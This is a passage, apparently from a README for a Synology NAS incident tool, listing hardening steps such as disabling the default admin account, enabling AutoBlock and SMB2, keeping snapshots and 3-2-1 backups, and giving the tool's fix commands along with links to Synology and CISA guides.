- **Harden authentication and protocols:** Disable the default `admin` account, enable 2-step verification, turn on AutoBlock, and set minimum SMB protocol to SMB2 (`nas incident fix --only admin_account,autoblock,smb_min_protocol`) ([Synology Security Tutorial](https://kb.synology.com/zh-tw/DSM/tutorial/How_to_add_extra_security_to_your_Synology_NAS)).
- **Protect snapshots and offline backups:** Enable scheduled Btrfs snapshots (and Immutable Snapshots on supported models, while avoiding the WORM API lock on unsupported models via `nas incident fix --only snapshot_worm,snapshots --ransom-scan`) and maintain an offline or off-site 3-2-1 backup ([Synology Ransomware Prevention Tutorial](https://kb.synology.com/en-global/DSM/tutorial/How_can_I_prevent_ransomeware_attacks_on_my_Synology_device), [Synology WriteOnce KB](https://kb.synology.com/en-global/DSM/tutorial/which_synology_nas_models_support_WriteOnce_and_secure_snapshots)).
- **Full checklist:** See [`HARDENING.md`](HARDENING.md) for the complete DSM hardening guide and [`TROUBLESHOOTING.md`](TROUBLESHOOTING.md) for lockout and recovery solutions ([CISA #StopRansomware Guide](https://www.cisa.gov/stopransomware/ransomware-guide)).
